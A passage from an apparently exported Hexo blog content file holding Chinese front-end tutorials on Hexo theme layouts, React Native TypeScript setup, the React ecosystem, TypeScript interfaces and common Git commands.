&lt;div className='post'&gt; &lt;header&gt; &#123;page.photos.length &gt; 0 &amp;&amp; &lt;div className='post-cover' style=&#123;&#123; backgroundImage: `url($&#123;page.photos[0]&#125;)` &#125;&#125; /&gt; &#125; &lt;div className='post-title'&gt;&#123;page.title&#125;&lt;/div&gt; &lt;/header&gt; &lt;section className='post-content markdown'&gt; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html: page.content &#125;&#125; /&gt; &lt;/section&gt; &lt;/div&gt;)); 归档页归档页使用的入口文件是 me/layout/archive.jsx。基本的布局不说了，这里主要是介绍如何渲染其归档的数据。 归档的数据在 page.posts 里，这是一个数组，遍历它就行了。 12345678910111213import React from 'react';import layout from './baseLayout';export default layout((&#123; url_for, date, page &#125;) =&gt; ( &lt;ul className=\"post-archive\"&gt; &#123;page.posts.map((post, index) =&gt; ( &lt;li className=\"item\" key=&#123;index&#125;&gt; &lt;a className=\"title\" href=&#123;url_for(post.path)&#125;&gt;&#123;post.title&#125;&lt;/a&gt; &lt;span className=\"date\"&gt;&#123;date(post.date, \"YYYY-MM-DD\")&#125;&lt;/span&gt; &lt;/li&gt; ))&#125; &lt;/ul&gt;)); 在这里使用到了一些 hexo 内置的 api 工具函数，使用 url_for 格式化地址，主要是补全，使用 date 格式化时间，这是来自于 moment.js 库的 api。 再加上 css，美化一下。 123456789101112131415.post-archive &#123; margin: 0; padding: 12px 0; list-style: none; &gt; li.item &#123; padding: 16px; &gt; .title &#123; color: #39f &#125; &gt; .date &#123; color: #678; font-size: 14px; float: right; &#125; &#125;&#125; 分类页分类页的布局是会有两个，一个是所有的分类列表，另外一个是某个分类的详细列表。 所有的分类列表需要在 source 目录里创建一个 categories 目录，在 source/categories 里需要创建一个 index.md 指定布局的文件。 123456---title: 分类comments: falsetype: categorieslayout: categories--- 大致的意思是，分类列表使用 categories.jsx 这个布局文件。 分类的数据在 site.categories 里。 12345678site.categories.map((item, index) =&gt; ( &lt;a key=&#123;index&#125; href=&#123;`/categories/$&#123;item.name&#125;/`&#125; target='_blank'&gt; &#123;item.name&#125; &lt;/a&gt;)) 当访问 /category/ 时会使用 layout/categories.jsx，当访问 /category/react/ 时，会使用 layout/category.jsx。 现在来解析一下为什么会这样？首先，菜单写着 /categories，因为 source 里的文件编译后会搬到 public 里，也就是 source/categories -&gt; public/categories。public 目录与路由映射，也就是 /categories -&gt; public/categories，因此最终访问是来到了 source/categories，如果 source/categories 里有一个 index.html 那么直接是访问的是 index.html 文件，但是如果是 index.md，hexo 再做一个解析，在 index.md 里指定了布局文件，那么会直接映射到 me/layout/xxxx 里，最后渲染的是 me/layout/xxxx 的文件内容。 标签页标签页和分类页差不多，也是需要在 source 里创建一个 tags 目录，并在其创建 index.md，指定布局文件。 123456---title: 标签comments: falsetype: tagslayout: tags--- 当访问 /tags/ 时会使用 layout/tags.jsx，当访问 /tags/react/ 时，会使用 layout/tag.jsx。 源信息在文章的顶部是可以放置一些源信息的。它会合并在 page 对象里。 123456789---title: 从零开发属于自己的 Hexo 主题date: 2018-10-04 18:57:20categories: 前端tags: - 前端author: Lizhoohphotos: http://pic1.win4000.com/wallpaper/8/580f26440b230.jpg--- 例如上面的数据，可以这样获取： 123page.titlepage.authorpage.photos","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"React Native 配置 Typescript 编译","slug":"React Native/React Native 配置 Typescript 编译","date":"2018-10-04T07:35:34.000Z","updated":"2021-06-15T06:10:52.866Z","comments":true,"path":"/stories/2018/10/React Native/React Native 配置 Typescript 编译/","link":"","permalink":"http://me.lizhooh.com/stories/2018/10/React Native/React Native 配置 Typescript 编译/","excerpt":"前言TypeScript 作为 JavaScript 的一个富类型扩展语言，深受代码风格严谨的前端开发者欢迎。本篇文章将详细的介绍，如何在 React Native 里配置 Typescript 的编译。","text":"前言TypeScript 作为 JavaScript 的一个富类型扩展语言，深受代码风格严谨的前端开发者欢迎。本篇文章将详细的介绍，如何在 React Native 里配置 Typescript 的编译。 新版的 react native cli 已经支持创建 typescript 项目。react-native init myapp --template typescript 开始配置 Typescript 编译，主要使用到了一个模块：react-native-typescript-transformer。它能实时的在 React Native 加载 JavaScript 代码时，将 TS 代码编译成标准的 JavaScript 代码。 使用 TS 那么先安装相关依赖模块。 12yarn add tslib @types/react @types/react-nativeyarn add --dev react-native-typescript-transformer typescript 接着配置 tsconfig.json，这是用来告诉 Vscode Typescript 相关的编译方式。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&#123; \"compilerOptions\": &#123; \"target\": \"es2015\", \"lib\": [ \"dom\", \"dom.iterable\", \"esnext\" ], \"module\": \"esnext\", \"removeComments\": false, \"preserveConstEnums\": true, \"moduleResolution\": \"node\", \"experimentalDecorators\": true, \"noImplicitAny\": false, \"allowSyntheticDefaultImports\": true, \"outDir\": \"lib\", \"noUnusedLocals\": false, \"noUnusedParameters\": false, \"strictNullChecks\": false, \"noImplicitThis\": false, \"sourceMap\": true, \"baseUrl\": \"src\", \"rootDir\": \".\", \"jsx\": \"react\", \"allowJs\": true, \"resolveJsonModule\": true, \"allowUnusedLabels\": true, \"esModuleInterop\": true, \"locale\": \"zh-CN\", \"typeRoots\": [ \"node_modules/@types\", \"global.d.ts\" ], \"skipLibCheck\": true, \"strict\": true, \"forceConsistentCasingInFileNames\": true, \"isolatedModules\": false, \"noEmit\": true &#125;, \"exclude\": [ \"node_modules\", \"dist\", \"build\" ], \"compileOnSave\": false, \"include\": [ \"src\", \"global.d.ts\" ]&#125; 接着创建一个 rn-cli.config.js 文件，这是用来告诉 React Native 应该怎么处理相关的代码。 12345678module.exports = &#123; getTransformModulePath() &#123; return require.resolve('react-native-typescript-transformer'); &#125;, getSourceExts() &#123; return ['ts', 'tsx']; &#125;&#125; 大致的意思时在编译 js 时（从 ES6 到 ES5），再编译一下 ts。 到此为止 TypeScript 的配置已经完成了，接下来可以直接在项目里使用 .ts 或 .tsx 的文件。甚至还能 js 与 ts 代码互相引入。 接着修改入口文件： 1234567// index.jsimport &#123; AppRegistry &#125; from 'react-native';import App from './src/index';import &#123; name as appName &#125; from './app.json';AppRegistry.registerComponent(appName, () =&gt; App); 创建一个 src 目录，用于存放 ts 源码，并创建文件 src/index.tsx。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import React, &#123; useState &#125; from 'react';import &#123; StyleSheet, View, Text, TouchableOpacity as Touch,&#125; from 'react-native';export default () =&gt; &#123; const [state, update] = useState(&#123; count: 0, &#125;); const onPress = e =&gt; &#123; update(&#123; count: state.count + 1 &#125;); &#125;; return ( &lt;View style=&#123;styles.root&#125;&gt; &lt;Text style=&#123;styles.text&#125;&gt;&#123;state.count&#125;&lt;/Text&gt; &lt;Touch activeOpacity=&#123;0.75&#125; style=&#123;styles.touch&#125; onPress=&#123;onPress&#125;&gt; &lt;Text style=&#123;styles.touchText&#125;&gt;+ 1&lt;/Text&gt; &lt;/Touch&gt; &lt;/View&gt; );&#125;const styles = StyleSheet.create(&#123; root: &#123; backgroundColor: '#fff', flex: 1, justifyContent: 'center', alignItems: 'center', &#125;, text: &#123; fontSize: 24, &#125;, touch: &#123; padding: 12, width: 100, backgroundColor: '#39f', borderRadius: 10, marginTop: 16, &#125;, touchText: &#123; textAlign: 'center', color: '#fff', &#125;,&#125;); 注意事项要注意的是： typescript 的 react 组件编写方式，只能在 .tsx 里编写组件代码。 在 typescript 引入 js 代码时，会存在类型问题。 部分第三方库没有默认导出。 部分第三方库没有编写 index.d.ts 文件，需要安装 @types/xxx 等。 eslint 对 typescript 的支持需要特定配置。ESlint 的配置参考：使用 ESLint 检查 Typescript 的代码 题外话RN &gt;= 0.59metro.config.js 12345module.exports = &#123; transformer: &#123; babelTransformerPath: require.resolve('react-native-typescript-transformer') &#125;&#125;; RN &gt;= 0.57, &lt; 0.59rn-cli.config.js 12345module.exports = &#123; transformer: &#123; babelTransformerPath: require.resolve('react-native-typescript-transformer') &#125;&#125; RN &lt; 0.57rn-cli.config.js 12345678module.exports = &#123; getTransformModulePath() &#123; return require.resolve('react-native-typescript-transformer'); &#125;, getSourceExts() &#123; return ['ts', 'tsx']; &#125;&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React 技术体系综述","slug":"React/React/React 技术体系综述","date":"2018-09-23T13:28:53.000Z","updated":"2021-06-15T06:10:52.878Z","comments":true,"path":"/stories/2018/09/React/React/React 技术体系综述/","link":"","permalink":"http://me.lizhooh.com/stories/2018/09/React/React/React 技术体系综述/","excerpt":"前言近年来，移动互联网应用有着爆发式的增长，同质化 App 层出不穷，人们对于产品体验的要求越来越高，渲染迟缓、交互卡顿的单体 Web App 已经无法满足现有用户苛刻的使用标准；与此同时，井喷式的业务需求迫使 iOS、Android 两个移动平台不断提升迭代开发速度，缩短版本发布周期；如何既能利用 Web 门槛低、轻量级、跨平台开发的优势，又能尽可能最大化屏蔽其现存缺点成了大前端融合领域攻克的重点，也是整个大前端化的一个核心的体现。 React 是一个前端开发框架，在经过了多年的发展，现在已经形成了一个很庞大的生态圈技术体系。其中就包括了：Web 应用开发、移动应用开发、桌面应用开发、小程序应用、WebVR 等都可以使用 React 的技术栈来开发。正如 React Native 官方所说的 “Learn once, write everywhere（学一次，到处写）” 的理念。 本文以笔者的开发经验，来介绍一下 React 的技术体系。","text":"前言近年来，移动互联网应用有着爆发式的增长，同质化 App 层出不穷，人们对于产品体验的要求越来越高，渲染迟缓、交互卡顿的单体 Web App 已经无法满足现有用户苛刻的使用标准；与此同时，井喷式的业务需求迫使 iOS、Android 两个移动平台不断提升迭代开发速度，缩短版本发布周期；如何既能利用 Web 门槛低、轻量级、跨平台开发的优势，又能尽可能最大化屏蔽其现存缺点成了大前端融合领域攻克的重点，也是整个大前端化的一个核心的体现。 React 是一个前端开发框架，在经过了多年的发展，现在已经形成了一个很庞大的生态圈技术体系。其中就包括了：Web 应用开发、移动应用开发、桌面应用开发、小程序应用、WebVR 等都可以使用 React 的技术栈来开发。正如 React Native 官方所说的 “Learn once, write everywhere（学一次，到处写）” 的理念。 本文以笔者的开发经验，来介绍一下 React 的技术体系。 名词介绍 ES6+：面向未来的 Javascript 语言规范。 React：现代的 Javascript 开发框架。 Redux：一个 JavaScript 数据状态容器，提供可预测化的状态管理。 Styled-Components：一个基于 React 的 CSS in JS 框架，拥有出色的渲染性能和编写方式。 PReact：更加轻量级的 Virtual DOM 实现，类似 React。 Electron：可以让你使用前端技术开发跨平台的桌面应用框架。 Taro：京东开源的 React 多端统一开发框架。 Less/Sass：更加高级的 CSS 预处理语言。 React-Native：FaceBoook 开源的一个跨平台混合式移动应用开发框架。 React-Router：基于 React 的前端路由框架。 Ant-Design：蚂蚁金服开源的 React 企业级前端组件库。 语言基础对于开发的语言基础，需要 ES6+ 的基础，这必须是 ES6+，否则无法体现现代化的组件化编程过程。其次是对于有一定能力的团队，可以升级使用 Typescript。 关键字： ES6+，Typescript，异步编程。 单页面应用单页面应用也叫：SPA，是一种新起的单页面应用开发模式，其特点就是基于 Javascript 的前后端分离式开发，在 SPA 里前端需要管理自己的视图以及数据，与后端的交互只需要通过 JSON 即可。另外还有一个名词：MPA（多页面应用）。 React 本身就是一个 SPA 应用开发框架，因此使用 React + React-Router + Redux 来开发一个单页面应用非常方便。 关键字： ES6+，React，React-Router，Redux，Less/Sass，Ant-Design，Styled-Components。 移动 Web 应用移动 Web 应用与 PC 端的应用不同，移动端在 Javascript 引擎上有着天生的能力缺陷，这意味着不能太过于按照 PC 端的开发方式。 对于 Web 移动端的项目，它有几个特点： 不出色的 Javascript 引擎，与 PC 端相比，移动端有着不出色的渲染引擎，这意味加载相同的 JS 代码，在移动端上需要更多的时间（有 5 ~ 10 倍的差距）。 3G/4G 网络因素影响，在 PC 端上几乎是秒开，在移动端上受不稳定的网络因素影响，经常会出现长时间的白屏。 脆弱的动画，任何动画效果都需要 GPU 的支持，在 PC 端上这方面几乎没什么压力，在移动端上 GPU 比较脆弱。 为了克服这些缺陷，在移动 Web 应用开发里，我们把 React 改为使用 PReact，其他基本不变。PReact 在压缩下只有 4k 左右的大小，以及更快的 Javascript 运行加载时间。 关键字： ES6+，PReact，Redux，Less/Sass。 PWA 渐进式应用PWA（全称：Progressive Web App）即渐进式 Web 应用，是 Google 公司于2015 年提出的，在 2018 成为了前端领域里的一个爆发点。PWA 与普通的 Web 应用不同的是，它能够借助浏览器提供的功能，渐进式的提升整个应用的功能，甚至是达到与 Native 端相媲美的程度。 PWA 最大的特点是：强交互，离线缓存，主屏幕化，消息推送，App 外观化。 关键字： ES6+，PReact，Redux，Less/Sass。 Javascript 同构应用同构即未来，还记得 Javascript 在服务端有 Nodejs 这个强大的支持吗？同构应用就是在有了 Nodejs 之后才诞生的一个新的概念以及开发模式。同构应用只能适用于 Javascript，因为只有 Javascript 才能做到使用同一种语言开发前后端。 同构应用通常也叫为 SSR 架构（服务端渲染架构）。在同构应用开发框架里与 React 相关的最出名的是：Next.js。Next.js 提供了开箱即用的开发方式，基本需要 SPA 应用特性又需要 SEO，此时升级为 SSR 应用是不错的选择。 关键字： ES6+，React，Redux，Next，Nodejs。 跨平台移动应用在移动应用领域里，很多人都会想到 Java，ObjC 等开发语言。但是在现在一种全新的开发模式牵起，FaceBoook 为我们提供了 React Native 这个跨平台的原生移动应用开发框架。在传统的使用 Java 开发应用需要 2 个月的时间，在 React Native 可能只需要 3 个星期就可以完全，并且有着更好维护方式，更好的开发体验。 关键字： ES6+，React，React-Native，Redux，Styled-Components。 小程序应用无论是微信小程序还是支付宝小程序甚至是百度小程序，它们都有一个共同的特点就是使用类似 Vue 的 Template 的编写语法（支付宝、百度参考了微信的设计，导致大家都是这种风格）。对于 Template 来说，其特点就是简单，但是也牺牲了一定的灵活性。为此一些不习惯或不喜欢使用 Template 语法的开发者开始吐槽并且创造。 其代表作就是京东的凹凸前端团队打造的可以使用 React 的技术栈开发小程序应用的框架：Taro。 Taro 能够让你仅此的使用 React 相关技术栈来开发小程序应用，这是一个非常强大的优势，基本熟悉 React 技术栈就可以无压力的上手基于 Taro 的小程序应用开发。 关键字： ES6+，Taro，React，Redux，Less/Sass。 跨平台桌面应用为了使用 Javascript 就能开发桌面应用？这完全得意于 Chrommun 与 Nodejs 这两个都基于 V8 引擎的框架。因此我们可以使用前端的技术来做桌面应用的 UI 层，使用 Nodejs 来做桌面应用的网络层和系统层，这样就可以像前端开发一个 Web 应用一样来开发一个跨平台的桌面应用，其最成功的代表框架是：Electron，基于 Electron 开发出来的明星产品是 Vscode。 下图是笔者，在做毕业设计时，使用 React + Redux + Electron 开发的云音乐桌面应用，取得的惊人的用户体验表现。 笔者配置的一个 Electron + React + WebPack 搭手架：https://github.com/Lizhooh/electron-react 关键字： Electron，Nodejs，React，React-Router，Redux，Styled-Components。 WebVRReactVR（目前已经改名为 React360） 同样是 FaceBoook 开源的一个专注于 WebVR 的框架，在技术层面上类似 React Native，通过封装的底层的接口，使用声明式 JSX 来构建 VR 应用。开发方式与 React，React Native 保持一致，可以零成本的学习与入门 WebVR 开发，并且这里有一篇文件介绍 ReactVR：React VR 快速入门完全教程。 关键字： ES6+，React，Redux，ReactVR。 小结基本在上述的所有应用开发里关键字都会出现 React 和 Redux。因为 Redux 本身是一个数据层的框架，因此可以在各大平台上使用，不会与环境产生多大的关系。React 负责视图层，Redux 负责数据层，它们两个之间形成了一个很好的配置。 React 的生态圈技术非常广泛，学习 React 有效的减少技术债的问题，以最小的学习成本，创造最大的价值。在学习了 React 相关的技术，你还可以把这些开发的理念灌切到其他的开发领域里，所谓的一通百通，举一反三。 除了这样之外，与 React 相关还有很多丰富的框架和库：Dva、Rax、Gatsby 等。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"谈谈 Typescript 中的 Interface","slug":"Typescript/谈谈 Typescript 中的 Interface","date":"2018-09-20T14:00:09.000Z","updated":"2021-06-15T06:10:52.898Z","comments":true,"path":"/stories/2018/09/Typescript/谈谈 Typescript 中的 Interface/","link":"","permalink":"http://me.lizhooh.com/stories/2018/09/Typescript/谈谈 Typescript 中的 Interface/","excerpt":"前言Typescript 里的 Interface 的作用非常广泛，但我觉得最大的好处了有助于对参数的约束，还有另外一个好处就是在 vscode 里有非常好的智能提示功能。 下面就来谈谈 Typescript 中的 Interface，顺便说一点 Typescript 在 React 里的组件写法。","text":"前言Typescript 里的 Interface 的作用非常广泛，但我觉得最大的好处了有助于对参数的约束，还有另外一个好处就是在 vscode 里有非常好的智能提示功能。 下面就来谈谈 Typescript 中的 Interface，顺便说一点 Typescript 在 React 里的组件写法。 简单点简单来说 interface 就是用来定义参数的接口，也可以对某些变量进行声明，指定变量的类型等作用。 123456789interface IProps &#123; title: string,&#125;const Button = (&#123; title &#125;: IProps) =&gt; ( &lt;Touch&gt; &lt;Text&gt;&#123;title&#125;&lt;/Text&gt; &lt;/Touch&gt;); 当然 interface 也不只如此，对于非必填的可以使用 ? 指定。 1234567891011interface IProps &#123; title: string, style?: ViewStyle,&#125;const Button = (&#123; title, style &#125;: IProps) =&gt; ( &lt;Touch style=&#123;style&#125;&gt; &lt;Text&gt;&#123;title&#125;&lt;/Text&gt; &lt;/Touch&gt;); 此外，还可以继承已有的，这样可以避免一些重复的编写。 1234567891011interface IProps extends TouchableOpacityProps &#123; title: string, style?: ViewStyle,&#125;const Button = (&#123; title, style &#125;: IProps) =&gt; ( &lt;Touch style=&#123;style&#125;&gt; &lt;Text&gt;&#123;title&#125;&lt;/Text&gt; &lt;/Touch&gt;); 这样就可以不用重新写 TouchableOpacity 的 Props 了，直接继承即可。 其他，如果组件的声明还有其他属性需要用到，可以使用多余的键名方式。 123456interface IProps extends TouchableOpacityProps &#123; title: string, style?: ViewStyle, [rest: string]: any,&#125; 这样就算是使用 &lt;Button name=&#39;abc&#39; /&gt; 也不会报错。 如果 props 是一个函数，那怎么写呢？函数有普通的写法，以及箭头函数的方式。 12345678interface IProps extends TouchableOpacityProps &#123; title: string, style?: ViewStyle, renderIcon?: (icon: string) =&gt; React.ReactElement&lt;any&gt;, renderHeader?(): React.ReactElement&lt;View&gt;, [rest: string]: any,&#125; 如果 Props 是一个函数，并且有回调函数时怎么写？同时也有多种写法。 12345678910interface Callback &#123; (item: any, index: number): any&#125;interface IProps extends TouchableOpacityProps &#123; // ... renderItem?: (item: any, index: number, cb: Function) =&gt; any, renderItem2?: (item: any, index: number, cb: Callback) =&gt; any, renderItem3?: (item: any, index: number, cb: (item: any, index: number) =&gt; any) =&gt; any,&#125; 这时可以直接写一个 Function，但是没有对应的参数提示，也可以写一个 interface 给回调函数，也可以直接在参数里写回调函数的类型（字面量接口）。 如果某个 Props 是一个枚举项时应该怎么写？使用 | 可以进行或操作。 123interface IProps extends TouchableOpacityProps &#123; type?: 'primary' | 'danger' | 'dashed',&#125; type 只能是这几个中的其中一个。也适用也多类型的写法：string | number。 当 type 只有一个类型时那就是必须了。 12345interface IProps extends TouchableOpacityProps &#123; type?: 'primary',&#125;&lt;Button type='primary' /&gt; 因此，这样会很古怪，type 只能选择 primary。 很遗憾的是 interface 不能编写默认值。 如果 Props 支持很多的类型呢？这时可以使用交叉类型。 交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。 123interface IProps extends TouchableOpacityProps &#123; data?: Person &amp; Serializable &amp; Loggable,&#125; 这个 data 就综合了 Person、Serializable、Loggable 的所有属性与方法。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"Git 命令集合","slug":"Nodejs/Git 命令集合","date":"2018-09-15T10:36:10.000Z","updated":"2021-06-15T06:10:52.832Z","comments":true,"path":"/stories/2018/09/Nodejs/Git 命令集合/","link":"","permalink":"http://me.lizhooh.com/stories/2018/09/Nodejs/Git 命令集合/","excerpt":"GitGit是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 几个专门用的名词： Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库","text":"GitGit是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 几个专门用的名词： Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 工作流你的本地仓库由git维护的三棵树组成。第一个是 你的工作目录（Workspace），它持有实际文件；第二个是 缓存区（Index），它像个缓存区域，临时保存你的改动；第三个是 HEAD，指向你最近一次提交后的结果。 创建新仓库创建新文件夹，打开，然后执行： 1git init 检出仓库执行如下命令以创建一个本地仓库的克隆版本： 1git clone /path/to/repository 如果是远端服务器上的仓库，你的命令会是这个样子： 1git clone username@host:/path/to/repository 添加与提交你可以计划改动（把它们添加到缓存区），使用如下命令： 12git add &lt;filename&gt;git add * 这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：（ -m 注释可以通过单引号来换行） 1git commit -m \"代码提交信息\" 现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。 推送改动你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：（origin 是默认的意思） 1git push origin master 如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加： 1git remote add origin &lt;server&gt; 查看当前的远端仓库： 1git remote show &lt;origin&gt; 分支分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认的”。在其他分支上进行开发，完成后再将它们合并到主分支上。 创建一个叫做“feature_x”的分支，并切换过去： 1git checkout -b feature_x 切换回主分支： 1git checkout master 查看本地分支： 1git branch 再把新建的分支删掉： 1git branch -d feature_x 除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的： 1git push origin &lt;branch&gt; 更新与合并要更新你的本地仓库至最新改动，执行： 1git pull 以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。要合并其他分支到你的当前分支（例如 master），执行： 1git merge &lt;branch&gt; 两种情况下，git 都会尝试去自动合并改动。不幸的是，自动合并并非次次都能成功，并可能导致 冲突（conflicts）。这时候就需要你修改这些文件来手动合并这些 冲突（conflicts） 了。改完之后，你需要执行如下命令以将它们标记为合并成功： 1git add &lt;filename&gt; 标签在软件发布时创建标签，是被推荐的。这是个旧有概念，在 SVN 中也有。可以执行如下命令以创建一个叫做 1.0.0 的标签： 1git tag 1.0.0 1b2e1d63ff 1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。使用如下命令获取提交 ID： 1git log 你也可以用该提交 ID 的少一些的前几位，只要它是唯一的。 替换本地改动假如你做错事（自然，这是不可能的），你可以使用如下命令替换掉本地改动： 1git checkout --&lt;filename&gt; 此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到缓存区的改动，以及新文件，都不受影响。 假如你想要丢弃你所有的本地改动与提交，可以到服务器上获取最新的版本并将你本地主分支指向到它： 12git fetch origingit reset --hard origin/master 常用命令一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。 新建代码库12345678# 在当前目录新建一个Git代码库git init# 新建一个目录，将其初始化为Git代码库git init [project-name]# 下载一个项目和它的整个代码历史git clone [url 12345# 执行如下命令以创建一个本地仓库的克隆版本：git clone /path/to/repository# 如果是远端服务器上的仓库，你的命令会是这个样子：git clone username@host:/path/to/repository 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789# 显示当前的Git配置git config --list# 编辑Git配置文件git config -e [--global]# 设置提交代码时的用户信息git config [--global] user.name \"[name]\"git config [--global] user.email \"[email address]\" 增加/删除文件123456789101112131415161718192021# 添加指定文件到暂存区git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录git add [dir]# 添加当前目录的所有文件到暂存区git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交git add -p# 删除工作区文件，并且将这次删除放入暂存区git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区git rm --cached [file]# 改名文件，并且将这个改名放入暂存区git mv [file-original] [file-renamed] 代码提交123456789101112131415161718# 提交暂存区到仓库区git commit -m [message]# 提交暂存区的指定文件到仓库区git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区git commit -a# 提交时显示所有diff信息git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化git commit --amend [file1] [file2] ... 分支123456789101112131415161718192021222324252627282930313233343536373839404142# 列出所有本地分支git branch# 列出所有远程分支git branch -r# 列出所有本地分支和远程分支git branch -a# 新建一个分支，但依然停留在当前分支git branch [branch-name]# 新建一个分支，并切换到该分支git checkout -b [branch]# 新建一个分支，指向指定commitgit branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区git checkout [branch-name]# 切换到上一个分支git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支git merge [branch]# 选择一个commit，合并进当前分支git cherry-pick [commit]# 删除分支git branch -d [branch-name]# 删除远程分支git push origin --delete [branch-name]git branch -dr [remote/branch] 标签1234567891011121314151617181920212223242526# 列出所有taggit tag# 新建一个tag在当前commitgit tag [tag]# 新建一个tag在指定commitgit tag [tag] [commit]# 删除本地taggit tag -d [tag]# 删除远程taggit push origin :refs/tags/[tagName]# 查看tag信息git show [tag]# 提交指定taggit push [remote] [tag]# 提交所有taggit push [remote] --tags# 新建一个分支，指向某个taggit checkout -b [branch] [tag] 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件git status# 显示当前分支的版本历史git log# 显示commit历史，以及每次commit发生变更的文件git log --stat# 搜索提交历史，根据关键词git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名git log --follow [file]git whatchanged [file]# 显示指定文件相关的每一次diffgit log -p [file]# 显示过去5次提交git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序git shortlog -sn# 显示指定文件是什么人在什么时间修改过git blame [file]# 显示暂存区和工作区的差异git diff# 显示暂存区和上一个commit的差异git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异git diff HEAD# 显示两次提交之间的差异git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码git diff --shortstat \"@&#123;0 day ago&#125;\"# 显示某次提交的元数据和内容变化git show [commit]# 显示某次提交发生变化的文件git show --name-only [commit]# 显示某次提交时，某个文件的内容git show [commit]:[filename]# 显示当前分支的最近几次提交git reflog 远程同步1234567891011121314151617181920212223# 下载远程仓库的所有变动git fetch [remote]# 显示所有远程仓库git remote -v# 显示某个远程仓库的信息git remote show [remote]# 增加一个新的远程仓库，并命名git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并git pull [remote] [branch]# 上传本地指定分支到远程仓库git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突git push [remote] --force# 推送所有分支到远程仓库git push [remote] --all 撤销 [回滚]12345678910111213141516171819202122232425262728293031# 恢复暂存区的指定文件到工作区git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区git checkout [commit] [file]# 恢复暂存区的所有文件到工作区git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变git reset [file]# 重置暂存区与工作区，与上一次commit保持一致git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支git revert [commit]# 暂时将未提交的变化移除，稍后再移入git stashgit stash pop 参考资料 http://www.bootcss.com/p/git-guide/http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"使用 React 技术栈开发小程序","slug":"小程序/使用 React 